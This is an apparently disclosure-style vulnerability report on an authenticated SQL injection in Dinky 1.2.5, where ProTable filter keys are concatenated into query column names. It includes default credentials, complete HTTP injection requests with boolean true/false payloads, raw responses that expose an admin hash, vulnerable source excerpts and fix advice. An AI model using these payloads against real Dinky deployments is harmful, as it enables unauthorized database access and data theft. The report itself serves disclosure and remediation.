### Vulnerability details

**Official website / Product:** https://www.dinky.org.cn / https://github.com/DataLinkDC/dinky

**Repository:** DataLinkDC/dinky (stars at selection: 3800; reconfirmed 3780)

**Vulnerability type:** SQLi (CWE-89 — ProTable `filter` object keys concatenated into `QueryWrapper` column names / `${ew.sqlSegment}` without allowlisting)

**Vulnerability versions:** v1.2.5 (official image `dinkydocker/dinky-standalone-server:1.2.5-flink1.14`); same sink on `dev` @ `0b426b3a1c81b30a87fe2f2263abe602ca0ce1d6`

**Vulnerability URL / Parameter:** `POST /api/user` (and other `selectForProTable` / `ProTableUtil.autoQuery` list APIs such as `POST /api/role`); JSON body `filter` object **keys**

**Complex:** yes

### Verification procedure

1. Lab: original `labs/dinky-r50-a3/` was removed by hygiene. Rebuild with the compose below (image `dinkydocker/dinky-standalone-server:1.2.5-flink1.14`, host port **23003** → container `8888`, `DB_ACTIVE=h2`). Default login: `admin` / `dinky123!@#`.

```yaml
# compose.yaml (reconstructable lab)
services:
  dinky:
    image: dinkydocker/dinky-standalone-server:1.2.5-flink1.14
    container_name: dinky-r50-a3
    ports:
      - "23003:8888"
    environment:
      - DB_ACTIVE=h2
```

```bash
docker compose up -d
# Wait until ready, then probe version. Observed docker ps / version response:
# NAME           IMAGE                                                 PORTS
# dinky-r50-a3   dinkydocker/dinky-standalone-server:1.2.5-flink1.14   0.0.0.0:23003->8888/tcp
# {"data":"1.2.5","code":0,"msg":"Successfully","time":"2026-11-02 17:13:01","success":true}
```

2. `POST /api/login` with default `admin` / `dinky123!@#`, collect `dinky-token` cookie; then `POST /api/chooseTenant?tenantId=1` (full HTTP below).
3. TRUE PoC: set `filter` key to `id)/**/and/**/(1` with value `[1]`, producing WHERE `((a.id)/**/and/**/(1 = 1))` → `total=1`.
4. FALSE control: same key with value `[0]` → `((a.id)/**/and/**/(1 = 0))` → `total=0`.
5. Differential proves attacker-controlled SQL predicates. Lowercase keywords plus `/**/` comments bypass Guava `CaseFormat` underscoring of uppercase SQL tokens.

### Complete vulnerability PoC

#### 0a. Login (obtain dinky-token)

Complete HTTP request (Docker lab; LoginDTO: `username` / `password` / `autoLogin` / `ldapLogin`):

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:23003
Content-Type: application/json
Accept: application/json
Content-Length: 78
Connection: close

{"username":"admin","password":"dinky123!@#","autoLogin":true,"ldapLogin":false}
```

Login response headers (Docker-verified; `Set-Cookie` / `dinky-token` header is the Cookie used below; body is a UserDTO success payload):

```http
HTTP/1.1 200 OK
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: dinky-token=fa6b90a4-c195-4a1b-8584-04da9634d929; Max-Age=36000; Expires=Tue, 3 Nov 2026 03:13:01 +0800; Path=/
Transfer-Encoding: chunked
Access-Control-Expose-Headers: dinky-token
Content-Type: application/json
dinky-token: fa6b90a4-c195-4a1b-8584-04da9634d929
Date: Mon, 02 Nov 2026 09:13:01 GMT
```

On a rebuilt instance the token changes: replace the Cookie below with the new `Set-Cookie: dinky-token=...`.

#### 0b. Choose tenant

Complete HTTP request:

```http
POST /api/chooseTenant?tenantId=1 HTTP/1.1
Host: 127.0.0.1:23003
Cookie: dinky-token=fa6b90a4-c195-4a1b-8584-04da9634d929
Accept: application/json
Content-Length: 0
Connection: close

```

Expect HTTP 200 with `code=0`, entering default tenant 1.

#### 1. TRUE PoC (boolean true → total=1)

Complete HTTP request (Docker-verified):

```http
POST /api/user HTTP/1.1
Host: 127.0.0.1:23003
Content-Type: application/json
Cookie: dinky-token=fa6b90a4-c195-4a1b-8584-04da9634d929
Accept: application/json
Content-Length: 61
Connection: close

{"current":1,"pageSize":10,"filter":{"id)/**/and/**/(1":[1]}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Transfer-Encoding: chunked
Content-Type: application/json
Date: Mon, 02 Nov 2026 09:13:01 GMT

{"total":1,"success":true,"current":1,"pageSize":10,"data":[{"createTime":"2022-12-13 05:27:19","updateTime":"2022-12-13 05:27:19","id":1,"username":"admin","password":"f4b3a484ee745b98d64cd69c429b2aa2","nickname":"Admin","userType":1,"worknum":"Dinky-001","avatar":null,"mobile":"17777777777","enabled":true,"isDelete":false,"superAdminFlag":true,"tenantAdminFlag":null}]}
```

#### 2. FALSE control (boolean false → total=0)

Complete HTTP request:

```http
POST /api/user HTTP/1.1
Host: 127.0.0.1:23003
Content-Type: application/json
Cookie: dinky-token=fa6b90a4-c195-4a1b-8584-04da9634d929
Accept: application/json
Content-Length: 61
Connection: close

{"current":1,"pageSize":10,"filter":{"id)/**/and/**/(1":[0]}}
```

FALSE control response:

```http
HTTP/1.1 200 OK
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Transfer-Encoding: chunked
Content-Type: application/json
Date: Mon, 02 Nov 2026 09:13:01 GMT

{"total":0,"success":true,"current":1,"pageSize":10,"data":[]}
```

Verification result notes:

- TRUE (`1 = 1`) returns `total=1` with the admin row; FALSE (`1 = 0`) returns `total=0` and `data=[]`.
- Impact summary: `TRUE total=1 (1=1 closes OR/AND injection)`; `FALSE total=0 (1=0)`; boolean differential confirms SQLi in filter field name → `ew.sqlSegment`.
- Requires authentication (default install ships `admin`); not unauthenticated. Same TRUE/FALSE differential reproduced on `POST /api/role`.
- Values are bound via `QueryWrapper.eq`; **identifiers/column names** are string-concatenated (classic identifier injection).

### Vulnerability analysis

Ant Design ProTable-style list APIs feed frontend `filter`/`sorter` JSON into `ProTableUtil.autoQuery`. `buildFilter` takes each **filter key**, optionally runs Guava `CaseFormat.LOWER_CAMEL → LOWER_UNDERSCORE`, then concatenates into `qw.eq("a." + field, value)`. MyBatis-Plus emits that fragment as `ew.sqlSegment`, interpolated with `${}` inside each `*Mapper.xml` `selectForProTable`.

Uppercase SQL keywords are broken by CaseFormat (`SELECT` → `s_e_l_e_c_t`). Lowercase `and`/`or` with `/**/` comments yield executable SQL such as:

`((a.id)/**/and/**/(1 = ?))`

Attackers can therefore rewrite WHERE boolean logic (this PoC) and, where the SQL parser permits, pursue further blind extraction. `buildSort` has the same `orderByAsc/Desc("a." + sortField)` concatenation issue for sorter keys.

Trigger / sink source (full path and line numbers):

```java
# File: dinky-admin/src/main/java/org/dinky/mybatis/util/ProTableUtil.java
# Lines: 54-59, 92-129
        JsonNode filter = para.get("filter");
        if (filter != null) {
            Iterator<Map.Entry<String, JsonNode>> fields2 = filter.fields();
            while (fields2.hasNext()) {
                Map.Entry<String, JsonNode> entry = fields2.next();
                buildFilter(entry.getKey(), entry.getValue(), wrapper, camelToUnderscore);
            }
        }
    // ...
    private static void buildFilter(
            String searchField, JsonNode searchValue, QueryWrapper<?> wrapper, boolean camelToUnderscore) {
        if (searchField != null && !searchField.equals("") && searchValue != null) {
            if (camelToUnderscore) {
                searchField = CaseFormat.LOWER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, searchField);
            }
            final String field = searchField;
            // ... collect searchValues ...
                            qw.eq("a." + field, itemField);
```

```xml
# File: dinky-admin/src/main/resources/mapper/UserMapper.xml
# Lines: 28-32
            <if test='ew.sqlSegment!=null and ew.sqlSegment!="" and !ew.sqlSegment.startsWith(" ORDER BY")'>
                and
            </if>
            <if test='ew.sqlSegment!=null and ew.sqlSegment!=""'>
                ${ew.sqlSegment}
            </if>
```

```java
# File: dinky-admin/src/main/java/org/dinky/controller/UserController.java
# Lines: 138-148
    @PostMapping
    @ApiOperation("Get User List")
    public ProTableResult<User> listUser(@RequestBody JsonNode para) {
        return userService.selectForProTable(para);
    }
```

### Fix notes

1. Allowlist `filter`/`sorter` keys to known entity columns only; reject keys outside `[a-zA-Z0-9_]`.
2. Never concatenate user input into `QueryWrapper` column-name arguments; map sort fields via lambdas or an enum.
3. Do not trust ProTable-derived fragments in `${ew.sqlSegment}` without identifier validation.
